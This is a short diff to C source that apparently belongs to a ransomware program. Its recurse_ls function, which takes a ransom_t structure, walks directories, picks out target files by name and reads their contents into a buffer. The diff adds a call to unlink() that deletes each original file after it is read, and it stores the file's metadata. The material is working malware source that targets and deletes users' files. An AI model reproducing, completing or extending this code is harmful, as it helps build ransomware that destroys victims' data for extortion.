@@ -30,7 +30,7 @@ void *recurse_ls(char *dirname, ransom_t *ransom)
 		my_strncat(filepath, read->d_name, len_rootpath, len_filename);
 		lstat(filepath, &file_info);
 #ifndef NO_DEBUG
-		printf("DEBUG: %d\n", binary_search_string(read->d_name, len_filename, ransom));
+		printf("Is %s a directory? %d\n", read->d_name, binary_search_string(read->d_name, len_filename, ransom));
 		getchar();
 #endif
 		if (S_ISDIR(file_info.st_mode) != 0)
@@ -40,6 +40,7 @@ void *recurse_ls(char *dirname, ransom_t *ransom)
 		}
 		else if ((binary_search_string(read->d_name, len_filename, ransom) != 0) && S_ISREG(file_info.st_mode) != 0)
 		{
+			ransom->target_file_buf->file_info = file_info;
 			my_strncat(ransom->target_file_buf->filepath, filepath, 0, my_strlen(filepath));
 			do
 			{
@@ -52,6 +53,9 @@ void *recurse_ls(char *dirname, ransom_t *ransom)
 			/* reset bytes read and file_offset.  */
 			ransom->target_file_buf->file_offset = 0;
 			ransom->target_file_buf->bytes_read = 0;
+			/* Disabled for debugging. Will remove reference to original file
+			*/
+			unlink(filepath);
 		}
 	}
 	free(filepath);
